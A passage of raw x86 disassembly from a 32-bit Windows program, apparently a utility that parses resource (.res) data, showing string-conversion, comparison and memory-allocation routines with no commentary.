  401e54:	8b 44 07 fc          	mov    -0x4(%edi,%eax,1),%eax
  401e58:	3b 05 20 90 40 00    	cmp    0x409020,%eax
  401e5e:	75 de                	jne    0x401e3e
  401e60:	89 fe                	mov    %edi,%esi
  401e62:	83 c6 08             	add    $0x8,%esi
  401e65:	81 3e ff ff 11 00    	cmpl   $0x11ffff,(%esi)
  401e6b:	74 d1                	je     0x401e3e
  401e6d:	f9                   	stc
  401e6e:	c3                   	ret
  401e6f:	8b 3d 28 90 40 00    	mov    0x409028,%edi
  401e75:	8b 4f 04             	mov    0x4(%edi),%ecx
  401e78:	a1 20 90 40 00       	mov    0x409020,%eax
  401e7d:	40                   	inc    %eax
  401e7e:	89 44 0f fc          	mov    %eax,-0x4(%edi,%ecx,1)
  401e82:	c3                   	ret
  401e83:	66 83 3e ff          	cmpw   $0xffff,(%esi)
  401e87:	75 1f                	jne    0x401ea8
  401e89:	31 c0                	xor    %eax,%eax
  401e8b:	66 8b 46 02          	mov    0x2(%esi),%ax
  401e8f:	09 ed                	or     %ebp,%ebp
  401e91:	74 0d                	je     0x401ea0
  401e93:	39 e8                	cmp    %ebp,%eax
  401e95:	77 11                	ja     0x401ea8
  401e97:	72 07                	jb     0x401ea0
  401e99:	e8 d7 ff ff ff       	call   0x401e75
  401e9e:	f9                   	stc
  401e9f:	c3                   	ret
  401ea0:	89 c5                	mov    %eax,%ebp
  401ea2:	89 3d 28 90 40 00    	mov    %edi,0x409028
  401ea8:	f8                   	clc
  401ea9:	c3                   	ret
  401eaa:	66 83 3e ff          	cmpw   $0xffff,(%esi)
  401eae:	0f 84 99 00 00 00    	je     0x401f4d
  401eb4:	51                   	push   %ecx
  401eb5:	52                   	push   %edx
  401eb6:	09 ed                	or     %ebp,%ebp
  401eb8:	0f 84 85 00 00 00    	je     0x401f43
  401ebe:	f6 05 c4 ab 40 00 80 	testb  $0x80,0x40abc4
  401ec5:	74 16                	je     0x401edd
  401ec7:	6a ff                	push   $0xffffffff
  401ec9:	55                   	push   %ebp
  401eca:	6a ff                	push   $0xffffffff
  401ecc:	56                   	push   %esi
  401ecd:	6a 00                	push   $0x0
  401ecf:	e8 35 ff ff ff       	call   0x401e09
  401ed4:	50                   	push   %eax
  401ed5:	ff 15 5c 90 40 00    	call   *0x40905c
  401edb:	eb 55                	jmp    0x401f32
  401edd:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  401ee2:	6a 00                	push   $0x0
  401ee4:	6a 00                	push   $0x0
  401ee6:	68 00 01 00 00       	push   $0x100
  401eeb:	52                   	push   %edx
  401eec:	6a ff                	push   $0xffffffff
  401eee:	55                   	push   %ebp
  401eef:	6a 00                	push   $0x0
  401ef1:	6a 00                	push   $0x0
  401ef3:	81 c2 00 01 00 00    	add    $0x100,%edx
  401ef9:	6a 00                	push   $0x0
  401efb:	6a 00                	push   $0x0
  401efd:	68 00 01 00 00       	push   $0x100
  401f02:	52                   	push   %edx
  401f03:	6a ff                	push   $0xffffffff
  401f05:	56                   	push   %esi
  401f06:	6a 00                	push   $0x0
  401f08:	6a 00                	push   $0x0
  401f0a:	e8 27 01 01 00       	call   0x412036
  401f0f:	e8 22 01 01 00       	call   0x412036
  401f14:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  401f19:	6a ff                	push   $0xffffffff
  401f1b:	52                   	push   %edx
  401f1c:	81 c2 00 01 00 00    	add    $0x100,%edx
  401f22:	6a ff                	push   $0xffffffff
  401f24:	52                   	push   %edx
  401f25:	6a 00                	push   $0x0
  401f27:	e8 dd fe ff ff       	call   0x401e09
  401f2c:	50                   	push   %eax
  401f2d:	e8 2e 01 01 00       	call   0x412060
  401f32:	83 f8 01             	cmp    $0x1,%eax
  401f35:	74 0c                	je     0x401f43
  401f37:	83 f8 02             	cmp    $0x2,%eax
  401f3a:	75 0f                	jne    0x401f4b
  401f3c:	e8 34 ff ff ff       	call   0x401e75
  401f41:	eb 08                	jmp    0x401f4b
  401f43:	89 f5                	mov    %esi,%ebp
  401f45:	89 3d 28 90 40 00    	mov    %edi,0x409028
  401f4b:	5a                   	pop    %edx
  401f4c:	59                   	pop    %ecx
  401f4d:	c3                   	ret
  401f4e:	50                   	push   %eax
  401f4f:	51                   	push   %ecx
  401f50:	57                   	push   %edi
  401f51:	89 f9                	mov    %edi,%ecx
  401f53:	83 e9 09             	sub    $0x9,%ecx
  401f56:	8b 3d 00 90 40 00    	mov    0x409000,%edi
  401f5c:	29 f9                	sub    %edi,%ecx
  401f5e:	76 0c                	jbe    0x401f6c
  401f60:	49                   	dec    %ecx
  401f61:	74 09                	je     0x401f6c
  401f63:	8a 44 0f ff          	mov    -0x1(%edi,%ecx,1),%al
  401f67:	38 04 0e             	cmp    %al,(%esi,%ecx,1)
  401f6a:	74 f4                	je     0x401f60
  401f6c:	5f                   	pop    %edi
  401f6d:	59                   	pop    %ecx
  401f6e:	58                   	pop    %eax
  401f6f:	c3                   	ret
  401f70:	03 00                	add    (%eax),%eax
  401f72:	83 c0 04             	add    $0x4,%eax
  401f75:	8b 18                	mov    (%eax),%ebx
  401f77:	83 c0 04             	add    $0x4,%eax
  401f7a:	8b 08                	mov    (%eax),%ecx
  401f7c:	41                   	inc    %ecx
  401f7d:	29 d9                	sub    %ebx,%ecx
  401f7f:	88 cd                	mov    %cl,%ch
  401f81:	43                   	inc    %ebx
  401f82:	83 c0 04             	add    $0x4,%eax
  401f85:	8b 30                	mov    (%eax),%esi
  401f87:	8a 0e                	mov    (%esi),%cl
  401f89:	80 f9 00             	cmp    $0x0,%cl
  401f8c:	74 1b                	je     0x401fa9
  401f8e:	46                   	inc    %esi
  401f8f:	38 16                	cmp    %dl,(%esi)
  401f91:	75 10                	jne    0x401fa3
  401f93:	f6 05 c7 ab 40 00 40 	testb  $0x40,0x40abc7
  401f9a:	74 13                	je     0x401faf
  401f9c:	e8 ad ff ff ff       	call   0x401f4e
  401fa1:	74 0c                	je     0x401faf
  401fa3:	01 de                	add    %ebx,%esi
  401fa5:	fe c9                	dec    %cl
  401fa7:	75 e6                	jne    0x401f8f
  401fa9:	fe cd                	dec    %ch
  401fab:	75 d4                	jne    0x401f81
  401fad:	f9                   	stc
  401fae:	c3                   	ret
  401faf:	46                   	inc    %esi
  401fb0:	4b                   	dec    %ebx
  401fb1:	89 d9                	mov    %ebx,%ecx
  401fb3:	e3 02                	jecxz  0x401fb7
  401fb5:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401fb7:	c3                   	ret
  401fb8:	66 81 3b ff ff       	cmpw   $0xffff,(%ebx)
  401fbd:	75 6c                	jne    0x40202b
  401fbf:	31 c0                	xor    %eax,%eax
  401fc1:	66 8b 43 02          	mov    0x2(%ebx),%ax
  401fc5:	f6 05 c7 ab 40 00 04 	testb  $0x4,0x40abc7
  401fcc:	74 50                	je     0x40201e
  401fce:	89 c2                	mov    %eax,%edx
  401fd0:	3b 15 94 cb 40 00    	cmp    0x40cb94,%edx
  401fd6:	76 1b                	jbe    0x401ff3
  401fd8:	be 67 96 40 00       	mov    $0x409667,%esi
  401fdd:	81 fa ff 00 00 00    	cmp    $0xff,%edx
  401fe3:	77 05                	ja     0x401fea
  401fe5:	be 59 96 40 00       	mov    $0x409659,%esi
  401fea:	e8 5f f0 ff ff       	call   0x40104e
  401fef:	89 d0                	mov    %edx,%eax
  401ff1:	eb 2b                	jmp    0x40201e
  401ff3:	be 7a 96 40 00       	mov    $0x40967a,%esi
  401ff8:	83 fa 04             	cmp    $0x4,%edx
  401ffb:	74 0a                	je     0x402007
  401ffd:	be 89 96 40 00       	mov    $0x409689,%esi
  402002:	83 fa 05             	cmp    $0x5,%edx
  402005:	75 07                	jne    0x40200e
  402007:	e8 42 f0 ff ff       	call   0x40104e
  40200c:	eb 18                	jmp    0x402026
  40200e:	b8 64 cb 40 00       	mov    $0x40cb64,%eax
  402013:	53                   	push   %ebx
  402014:	e8 5c ff ff ff       	call   0x401f75
  402019:	5b                   	pop    %ebx
  40201a:	72 c9                	jb     0x401fe5
  40201c:	eb 08                	jmp    0x402026
  40201e:	e8 dd ef ff ff       	call   0x401000
  402023:	b0 68                	mov    $0x68,%al
  402025:	aa                   	stos   %al,%es:(%edi)
  402026:	83 c3 04             	add    $0x4,%ebx
  402029:	eb 1d                	jmp    0x402048
  40202b:	6a 00                	push   $0x0
  40202d:	6a 00                	push   $0x0
  40202f:	68 00 01 00 00       	push   $0x100
  402034:	57                   	push   %edi
  402035:	6a ff                	push   $0xffffffff
  402037:	53                   	push   %ebx
  402038:	6a 00                	push   $0x0
  40203a:	6a 00                	push   $0x0
  40203c:	e8 f5 ff 00 00       	call   0x412036
  402041:	01 c7                	add    %eax,%edi
  402043:	4f                   	dec    %edi
  402044:	d1 e0                	shl    $1,%eax
  402046:	01 c3                	add    %eax,%ebx
  402048:	b0 0a                	mov    $0xa,%al
  40204a:	aa                   	stos   %al,%es:(%edi)
  40204b:	c3                   	ret
  40204c:	89 c6                	mov    %eax,%esi
  40204e:	8b 0e                	mov    (%esi),%ecx
  402050:	83 c6 04             	add    $0x4,%esi
  402053:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402055:	c3                   	ret
  402056:	55                   	push   %ebp
  402057:	52                   	push   %edx
  402058:	57                   	push   %edi
  402059:	89 d5                	mov    %edx,%ebp
  40205b:	81 e2 ff 03 00 00    	and    $0x3ff,%edx
  402061:	f7 c2 00 03 00 00    	test   $0x300,%edx
  402067:	75 44                	jne    0x4020ad
  402069:	b8 58 c4 40 00       	mov    $0x40c458,%eax
  40206e:	e8 d9 ff ff ff       	call   0x40204c
  402073:	89 3d 00 90 40 00    	mov    %edi,0x409000
  402079:	e8 f2 fe ff ff       	call   0x401f70
  40207e:	72 2d                	jb     0x4020ad
  402080:	66 b8 2c 20          	mov    $0x202c,%ax
  402084:	66 ab                	stos   %ax,%es:(%edi)
  402086:	89 ea                	mov    %ebp,%edx
  402088:	c1 ea 0a             	shr    $0xa,%edx
  40208b:	b8 54 ca 40 00       	mov    $0x40ca54,%eax
  402090:	e8 b7 ff ff ff       	call   0x40204c
  402095:	80 0d c7 ab 40 00 40 	orb    $0x40,0x40abc7
  40209c:	e8 cf fe ff ff       	call   0x401f70
  4020a1:	72 0a                	jb     0x4020ad
  4020a3:	80 25 c7 ab 40 00 bf 	andb   $0xbf,0x40abc7
  4020aa:	58                   	pop    %eax
  4020ab:	eb 09                	jmp    0x4020b6
  4020ad:	80 25 c7 ab 40 00 bf 	andb   $0xbf,0x40abc7
  4020b4:	5f                   	pop    %edi
  4020b5:	f9                   	stc
  4020b6:	5a                   	pop    %edx
  4020b7:	5d                   	pop    %ebp
  4020b8:	c3                   	ret
  4020b9:	89 d3                	mov    %edx,%ebx
  4020bb:	8b 43 04             	mov    0x4(%ebx),%eax
  4020be:	01 d8                	add    %ebx,%eax
  4020c0:	66 8b 40 f6          	mov    -0xa(%eax),%ax
  4020c4:	25 ff ff 00 00       	and    $0xffff,%eax
  4020c9:	50                   	push   %eax
  4020ca:	bf c0 f2 40 00       	mov    $0x40f2c0,%edi
  4020cf:	be d6 95 40 00       	mov    $0x4095d6,%esi
  4020d4:	e8 75 ef ff ff       	call   0x40104e
  4020d9:	be 0d 96 40 00       	mov    $0x40960d,%esi
  4020de:	e8 6b ef ff ff       	call   0x40104e
  4020e3:	83 c3 08             	add    $0x8,%ebx
  4020e6:	80 0d c7 ab 40 00 04 	orb    $0x4,0x40abc7
  4020ed:	e8 c6 fe ff ff       	call   0x401fb8
  4020f2:	80 25 c7 ab 40 00 fb 	andb   $0xfb,0x40abc7
  4020f9:	be 1d 96 40 00       	mov    $0x40961d,%esi
  4020fe:	e8 4b ef ff ff       	call   0x40104e
  402103:	e8 b0 fe ff ff       	call   0x401fb8
  402108:	be 26 96 40 00       	mov    $0x409626,%esi
  40210d:	e8 3c ef ff ff       	call   0x40104e
  402112:	5a                   	pop    %edx
  402113:	e8 3e ff ff ff       	call   0x402056
  402118:	73 14                	jae    0x40212e
  40211a:	89 d0                	mov    %edx,%eax
  40211c:	e8 df ee ff ff       	call   0x401000
  402121:	b0 68                	mov    $0x68,%al
  402123:	aa                   	stos   %al,%es:(%edi)
  402124:	be 47 96 40 00       	mov    $0x409647,%esi
  402129:	e8 20 ef ff ff       	call   0x40104e
  40212e:	66 b8 0a 00          	mov    $0xa,%ax
  402132:	66 ab                	stos   %ax,%es:(%edi)
  402134:	c3                   	ret
  402135:	51                   	push   %ecx
  402136:	52                   	push   %edx
  402137:	56                   	push   %esi
  402138:	31 ed                	xor    %ebp,%ebp
  40213a:	4d                   	dec    %ebp
  40213b:	89 d3                	mov    %edx,%ebx
  40213d:	8b 4a 04             	mov    0x4(%edx),%ecx
  402140:	83 e9 18             	sub    $0x18,%ecx
  402143:	76 37                	jbe    0x40217c
  402145:	83 c2 08             	add    $0x8,%edx
  402148:	e8 f1 fc ff ff       	call   0x401e3e
  40214d:	73 2d                	jae    0x40217c
  40214f:	39 d6                	cmp    %edx,%esi
  402151:	74 11                	je     0x402164
  402153:	51                   	push   %ecx
  402154:	52                   	push   %edx
  402155:	8a 06                	mov    (%esi),%al
  402157:	38 02                	cmp    %al,(%edx)
  402159:	75 05                	jne    0x402160
  40215b:	46                   	inc    %esi
  40215c:	42                   	inc    %edx
  40215d:	49                   	dec    %ecx
  40215e:	75 f5                	jne    0x402155
  402160:	5a                   	pop    %edx
  402161:	59                   	pop    %ecx
  402162:	75 e4                	jne    0x402148
  402164:	e8 a0 fc ff ff       	call   0x401e09
  402169:	39 e8                	cmp    %ebp,%eax
  40216b:	74 0c                	je     0x402179
  40216d:	77 d9                	ja     0x402148
  40216f:	89 c5                	mov    %eax,%ebp
  402171:	89 3d 28 90 40 00    	mov    %edi,0x409028
  402177:	eb cf                	jmp    0x402148
  402179:	f9                   	stc
  40217a:	eb 0b                	jmp    0x402187
  40217c:	83 fd ff             	cmp    $0xffffffff,%ebp
  40217f:	74 05                	je     0x402186
  402181:	e8 e9 fc ff ff       	call   0x401e6f
  402186:	f8                   	clc
  402187:	5e                   	pop    %esi
  402188:	5a                   	pop    %edx
  402189:	59                   	pop    %ecx
  40218a:	c3                   	ret
  40218b:	e8 a2 fc ff ff       	call   0x401e32
  402190:	e8 a9 fc ff ff       	call   0x401e3e
  402195:	73 07                	jae    0x40219e
  402197:	e8 0e fd ff ff       	call   0x401eaa
  40219c:	eb f2                	jmp    0x402190
  40219e:	09 ed                	or     %ebp,%ebp
  4021a0:	74 05                	je     0x4021a7
  4021a2:	e8 c8 fc ff ff       	call   0x401e6f
  4021a7:	c3                   	ret
  4021a8:	e8 85 fc ff ff       	call   0x401e32
  4021ad:	e8 8c fc ff ff       	call   0x401e3e
  4021b2:	73 07                	jae    0x4021bb
  4021b4:	e8 ca fc ff ff       	call   0x401e83
  4021b9:	eb f2                	jmp    0x4021ad
  4021bb:	09 ed                	or     %ebp,%ebp
  4021bd:	74 05                	je     0x4021c4
  4021bf:	e8 ab fc ff ff       	call   0x401e6f
  4021c4:	c3                   	ret
  4021c5:	51                   	push   %ecx
  4021c6:	52                   	push   %edx
  4021c7:	66 8b 02             	mov    (%edx),%ax
  4021ca:	66 39 06             	cmp    %ax,(%esi)
  4021cd:	75 0d                	jne    0x4021dc
  4021cf:	83 c2 02             	add    $0x2,%edx
  4021d2:	83 c6 02             	add    $0x2,%esi
  4021d5:	49                   	dec    %ecx
  4021d6:	75 ef                	jne    0x4021c7
  4021d8:	66 83 3e 00          	cmpw   $0x0,(%esi)
  4021dc:	5a                   	pop    %edx
  4021dd:	59                   	pop    %ecx
  4021de:	c3                   	ret
  4021df:	e8 5a fc ff ff       	call   0x401e3e
  4021e4:	73 11                	jae    0x4021f7
  4021e6:	66 83 3e ff          	cmpw   $0xffff,(%esi)
  4021ea:	74 f3                	je     0x4021df
  4021ec:	e8 d4 ff ff ff       	call   0x4021c5
  4021f1:	75 ec                	jne    0x4021df
  4021f3:	83 c6 02             	add    $0x2,%esi
  4021f6:	f9                   	stc
  4021f7:	c3                   	ret
  4021f8:	e8 41 fc ff ff       	call   0x401e3e
  4021fd:	73 12                	jae    0x402211
  4021ff:	66 83 3e ff          	cmpw   $0xffff,(%esi)
  402203:	75 f3                	jne    0x4021f8
  402205:	83 c6 02             	add    $0x2,%esi
  402208:	66 39 16             	cmp    %dx,(%esi)
  40220b:	75 eb                	jne    0x4021f8
  40220d:	83 c6 02             	add    $0x2,%esi
  402210:	f9                   	stc
  402211:	c3                   	ret
  402212:	8b 16                	mov    (%esi),%edx
  402214:	03 15 10 90 40 00    	add    0x409010,%edx
  40221a:	31 c9                	xor    %ecx,%ecx
  40221c:	66 8b 0a             	mov    (%edx),%cx
  40221f:	83 c2 02             	add    $0x2,%edx
  402222:	c3                   	ret
  402223:	51                   	push   %ecx
  402224:	56                   	push   %esi
  402225:	e8 e8 ff ff ff       	call   0x402212
  40222a:	e8 03 fc ff ff       	call   0x401e32
  40222f:	e8 ab ff ff ff       	call   0x4021df
  402234:	73 07                	jae    0x40223d
  402236:	e8 48 fc ff ff       	call   0x401e83
  40223b:	eb f2                	jmp    0x40222f
  40223d:	09 ed                	or     %ebp,%ebp
  40223f:	74 05                	je     0x402246
  402241:	e8 29 fc ff ff       	call   0x401e6f
  402246:	5e                   	pop    %esi
  402247:	59                   	pop    %ecx
  402248:	c3                   	ret
  402249:	51                   	push   %ecx
  40224a:	56                   	push   %esi
  40224b:	8b 16                	mov    (%esi),%edx
  40224d:	e8 e0 fb ff ff       	call   0x401e32
  402252:	e8 a1 ff ff ff       	call   0x4021f8
  402257:	73 07                	jae    0x402260
  402259:	e8 25 fc ff ff       	call   0x401e83
  40225e:	eb f2                	jmp    0x402252
  402260:	09 ed                	or     %ebp,%ebp
  402262:	74 05                	je     0x402269
  402264:	e8 06 fc ff ff       	call   0x401e6f
  402269:	5e                   	pop    %esi
  40226a:	59                   	pop    %ecx
  40226b:	c3                   	ret
  40226c:	51                   	push   %ecx
  40226d:	56                   	push   %esi
  40226e:	e8 9f ff ff ff       	call   0x402212
  402273:	e8 ba fb ff ff       	call   0x401e32
  402278:	e8 62 ff ff ff       	call   0x4021df
  40227d:	73 07                	jae    0x402286
  40227f:	e8 26 fc ff ff       	call   0x401eaa
  402284:	eb f2                	jmp    0x402278
  402286:	09 ed                	or     %ebp,%ebp
  402288:	74 05                	je     0x40228f
  40228a:	e8 e0 fb ff ff       	call   0x401e6f
  40228f:	5e                   	pop    %esi
  402290:	59                   	pop    %ecx
  402291:	c3                   	ret
  402292:	51                   	push   %ecx
  402293:	56                   	push   %esi
  402294:	8b 16                	mov    (%esi),%edx
  402296:	e8 97 fb ff ff       	call   0x401e32
  40229b:	e8 58 ff ff ff       	call   0x4021f8
  4022a0:	73 07                	jae    0x4022a9
  4022a2:	e8 03 fc ff ff       	call   0x401eaa
  4022a7:	eb f2                	jmp    0x40229b
  4022a9:	09 ed                	or     %ebp,%ebp
  4022ab:	74 05                	je     0x4022b2
  4022ad:	e8 bd fb ff ff       	call   0x401e6f
  4022b2:	5e                   	pop    %esi
  4022b3:	59                   	pop    %ecx
  4022b4:	c3                   	ret
  4022b5:	8b 1d 0c 90 40 00    	mov    0x40900c,%ebx
  4022bb:	89 2b                	mov    %ebp,(%ebx)
  4022bd:	a1 28 90 40 00       	mov    0x409028,%eax
  4022c2:	89 43 04             	mov    %eax,0x4(%ebx)
  4022c5:	83 05 0c 90 40 00 08 	addl   $0x8,0x40900c
  4022cc:	c3                   	ret
  4022cd:	51                   	push   %ecx
  4022ce:	56                   	push   %esi
  4022cf:	89 e8                	mov    %ebp,%eax
  4022d1:	83 c0 02             	add    $0x2,%eax
  4022d4:	8b 15 78 aa 40 00    	mov    0x40aa78,%edx
  4022da:	66 83 78 fe 00       	cmpw   $0x0,-0x2(%eax)
  4022df:	74 07                	je     0x4022e8
  4022e1:	83 c0 02             	add    $0x2,%eax
  4022e4:	39 d0                	cmp    %edx,%eax
  4022e6:	72 f2                	jb     0x4022da
  4022e8:	89 c1                	mov    %eax,%ecx
  4022ea:	29 e9                	sub    %ebp,%ecx
  4022ec:	83 e9 02             	sub    $0x2,%ecx
  4022ef:	72 3a                	jb     0x40232b
  4022f1:	d1 e9                	shr    $1,%ecx
  4022f3:	8b 3d 14 90 40 00    	mov    0x409014,%edi
  4022f9:	8b 1d 0c 90 40 00    	mov    0x40900c,%ebx
  4022ff:	89 f8                	mov    %edi,%eax
  402301:	2b 05 10 90 40 00    	sub    0x409010,%eax
  402307:	89 03                	mov    %eax,(%ebx)
  402309:	a1 28 90 40 00       	mov    0x409028,%eax
  40230e:	89 43 04             	mov    %eax,0x4(%ebx)
  402311:	83 05 0c 90 40 00 08 	addl   $0x8,0x40900c
  402318:	66 89 0f             	mov    %cx,(%edi)
  40231b:	83 c7 02             	add    $0x2,%edi
  40231e:	e3 05                	jecxz  0x402325
  402320:	89 ee                	mov    %ebp,%esi
  402322:	f3 66 a5             	rep movsw %ds:(%esi),%es:(%edi)
  402325:	89 3d 14 90 40 00    	mov    %edi,0x409014
  40232b:	5e                   	pop    %esi
  40232c:	59                   	pop    %ecx
  40232d:	c3                   	ret
  40232e:	a1 24 90 40 00       	mov    0x409024,%eax
  402333:	2b 05 1c 90 40 00    	sub    0x40901c,%eax
  402339:	0d 00 00 00 80       	or     $0x80000000,%eax
  40233e:	89 46 04             	mov    %eax,0x4(%esi)
  402341:	c3                   	ret
  402342:	8b 3d 0c 90 40 00    	mov    0x40900c,%edi
  402348:	89 3d 24 90 40 00    	mov    %edi,0x409024
  40234e:	31 c0                	xor    %eax,%eax
  402350:	ab                   	stos   %eax,%es:(%edi)
  402351:	a1 40 90 40 00       	mov    0x409040,%eax
  402356:	ab                   	stos   %eax,%es:(%edi)
  402357:	31 c0                	xor    %eax,%eax
  402359:	ab                   	stos   %eax,%es:(%edi)
  40235a:	ab                   	stos   %eax,%es:(%edi)
  40235b:	83 05 0c 90 40 00 10 	addl   $0x10,0x40900c
  402362:	c3                   	ret
  402363:	53                   	push   %ebx
  402364:	51                   	push   %ecx
  402365:	56                   	push   %esi
  402366:	8b 1d 28 90 40 00    	mov    0x409028,%ebx
  40236c:	8b 0b                	mov    (%ebx),%ecx
  40236e:	8b 3d 18 90 40 00    	mov    0x409018,%edi
  402374:	e8 a0 08 00 00       	call   0x402c19
  402379:	89 de                	mov    %ebx,%esi
  40237b:	03 73 04             	add    0x4(%ebx),%esi
  40237e:	8b 15 14 90 40 00    	mov    0x409014,%edx
  402384:	89 f8                	mov    %edi,%eax
  402386:	2b 05 10 90 40 00    	sub    0x409010,%eax
  40238c:	89 02                	mov    %eax,(%edx)
  40238e:	89 4a 04             	mov    %ecx,0x4(%edx)
  402391:	31 c0                	xor    %eax,%eax
  402393:	89 42 08             	mov    %eax,0x8(%edx)
  402396:	c7 42 0c 00 00 00 00 	movl   $0x0,0xc(%edx)
  40239d:	e3 08                	jecxz  0x4023a7
  40239f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4023a1:	89 3d 18 90 40 00    	mov    %edi,0x409018
  4023a7:	83 05 14 90 40 00 10 	addl   $0x10,0x409014
  4023ae:	2b 15 10 90 40 00    	sub    0x409010,%edx
  4023b4:	5e                   	pop    %esi
  4023b5:	59                   	pop    %ecx
  4023b6:	5b                   	pop    %ebx
  4023b7:	c3                   	ret
  4023b8:	01 06                	add    %eax,(%esi)
  4023ba:	89 f3                	mov    %esi,%ebx
  4023bc:	01 eb                	add    %ebp,%ebx
  4023be:	89 1f                	mov    %ebx,(%edi)
  4023c0:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  4023c7:	66 c7 47 08 07 00    	movw   $0x7,0x8(%edi)
  4023cd:	83 c7 0a             	add    $0xa,%edi
  4023d0:	83 c6 10             	add    $0x10,%esi
  4023d3:	e2 e3                	loop   0x4023b8
  4023d5:	c3                   	ret
  4023d6:	52                   	push   %edx
  4023d7:	31 d2                	xor    %edx,%edx
  4023d9:	42                   	inc    %edx
  4023da:	01 06                	add    %eax,(%esi)
  4023dc:	89 f3                	mov    %esi,%ebx
  4023de:	01 eb                	add    %ebp,%ebx
  4023e0:	89 1f                	mov    %ebx,(%edi)
  4023e2:	89 57 04             	mov    %edx,0x4(%edi)
  4023e5:	66 c7 47 08 03 00    	movw   $0x3,0x8(%edi)
  4023eb:	83 c7 0a             	add    $0xa,%edi
  4023ee:	83 c6 10             	add    $0x10,%esi
  4023f1:	e2 e6                	loop   0x4023d9
  4023f3:	5a                   	pop    %edx
  4023f4:	c3                   	ret
  4023f5:	8b 0d 2c 90 40 00    	mov    0x40902c,%ecx
  4023fb:	74 32                	je     0x40242f
  4023fd:	51                   	push   %ecx
  4023fe:	66 b8 24 52          	mov    $0x5224,%ax
  402402:	66 ab                	stos   %ax,%es:(%edi)
  402404:	8b 06                	mov    (%esi),%eax
  402406:	57                   	push   %edi
  402407:	52                   	push   %edx
  402408:	e8 f3 eb ff ff       	call   0x401000
  40240d:	5a                   	pop    %edx
  40240e:	5f                   	pop    %edi
  40240f:	83 c7 06             	add    $0x6,%edi
  402412:	31 c0                	xor    %eax,%eax
  402414:	ab                   	stos   %eax,%es:(%edi)
  402415:	b8 01 00 00 00       	mov    $0x1,%eax
  40241a:	66 ab                	stos   %ax,%es:(%edi)
  40241c:	31 c0                	xor    %eax,%eax
  40241e:	66 ab                	stos   %ax,%es:(%edi)
  402420:	b8 03 00 00 00       	mov    $0x3,%eax
  402425:	aa                   	stos   %al,%es:(%edi)
  402426:	31 c0                	xor    %eax,%eax
  402428:	aa                   	stos   %al,%es:(%edi)
  402429:	83 c6 10             	add    $0x10,%esi
  40242c:	59                   	pop    %ecx
  40242d:	e2 ce                	loop   0x4023fd
  40242f:	ab                   	stos   %eax,%es:(%edi)
  402430:	89 3d 18 90 40 00    	mov    %edi,0x409018
  402436:	c3                   	ret
  402437:	8b 1d 70 aa 40 00    	mov    0x40aa70,%ebx
  40243d:	83 3b 00             	cmpl   $0x0,(%ebx)
  402440:	75 61                	jne    0x4024a3
  402442:	83 7b 04 20          	cmpl   $0x20,0x4(%ebx)
  402446:	75 5b                	jne    0x4024a3
  402448:	81 7b 08 ff ff 00 00 	cmpl   $0xffff,0x8(%ebx)
  40244f:	75 52                	jne    0x4024a3
  402451:	83 c3 20             	add    $0x20,%ebx
  402454:	31 c9                	xor    %ecx,%ecx
  402456:	31 d2                	xor    %edx,%edx
  402458:	31 f6                	xor    %esi,%esi
  40245a:	3b 1d 78 aa 40 00    	cmp    0x40aa78,%ebx
  402460:	73 4c                	jae    0x4024ae
  402462:	89 df                	mov    %ebx,%edi
  402464:	03 37                	add    (%edi),%esi
  402466:	8b 43 04             	mov    0x4(%ebx),%eax
  402469:	03 1b                	add    (%ebx),%ebx
  40246b:	01 c3                	add    %eax,%ebx
  40246d:	3b 1d 78 aa 40 00    	cmp    0x40aa78,%ebx
  402473:	77 2e                	ja     0x4024a3
  402475:	81 7f 08 ff ff 11 00 	cmpl   $0x11ffff,0x8(%edi)
  40247c:	74 dc                	je     0x40245a
  40247e:	41                   	inc    %ecx
  40247f:	c7 44 07 fc 00 00 00 	movl   $0x0,-0x4(%edi,%eax,1)
  402486:	00 
  402487:	01 c2                	add    %eax,%edx
  402489:	83 ea 20             	sub    $0x20,%edx
  40248c:	e8 66 f9 ff ff       	call   0x401df7
  402491:	eb c7                	jmp    0x40245a
  402493:	f6 05 7e 90 40 00 04 	testb  $0x4,0x40907e
  40249a:	75 14                	jne    0x4024b0
  40249c:	ba b5 95 40 00       	mov    $0x4095b5,%edx
  4024a1:	eb 05                	jmp    0x4024a8
  4024a3:	ba 59 94 40 00       	mov    $0x409459,%edx
  4024a8:	e8 92 ec ff ff       	call   0x40113f
  4024ad:	c3                   	ret
  4024ae:	e3 e3                	jecxz  0x402493
  4024b0:	55                   	push   %ebp
  4024b1:	89 c8                	mov    %ecx,%eax
  4024b3:	a3 2c 90 40 00       	mov    %eax,0x40902c
  4024b8:	c1 e0 02             	shl    $0x2,%eax
  4024bb:	01 c2                	add    %eax,%edx
  4024bd:	c1 e0 02             	shl    $0x2,%eax
  4024c0:	a3 18 90 40 00       	mov    %eax,0x409018
  4024c5:	01 c2                	add    %eax,%edx
  4024c7:	01 c2                	add    %eax,%edx
  4024c9:	81 c2 00 02 00 00    	add    $0x200,%edx
  4024cf:	01 f2                	add    %esi,%edx
  4024d1:	31 c0                	xor    %eax,%eax
  4024d3:	f6 05 7f 90 40 00 01 	testb  $0x1,0x40907f
  4024da:	74 07                	je     0x4024e3
  4024dc:	89 c8                	mov    %ecx,%eax
  4024de:	d1 e0                	shl    $1,%eax
  4024e0:	8d 04 c0             	lea    (%eax,%eax,8),%eax
  4024e3:	c1 e1 06             	shl    $0x6,%ecx
  4024e6:	81 c1 00 02 00 00    	add    $0x200,%ecx
  4024ec:	01 c1                	add    %eax,%ecx
  4024ee:	6a 04                	push   $0x4
  4024f0:	68 00 10 00 00       	push   $0x1000
  4024f5:	52                   	push   %edx
  4024f6:	6a 00                	push   $0x0
  4024f8:	6a 04                	push   $0x4
  4024fa:	68 00 10 00 00       	push   $0x1000
  4024ff:	51                   	push   %ecx
  402500:	6a 00                	push   $0x0
  402502:	e8 47 fb 00 00       	call   0x41204e
  402507:	a3 08 90 40 00       	mov    %eax,0x409008
  40250c:	a3 0c 90 40 00       	mov    %eax,0x40900c
  402511:	e8 38 fb 00 00       	call   0x41204e
  402516:	a3 10 90 40 00       	mov    %eax,0x409010
  40251b:	a3 14 90 40 00       	mov    %eax,0x409014
  402520:	68 30 90 40 00       	push   $0x409030
  402525:	e8 3c fb 00 00       	call   0x412066
  40252a:	be 38 90 40 00       	mov    $0x409038,%esi
  40252f:	56                   	push   %esi
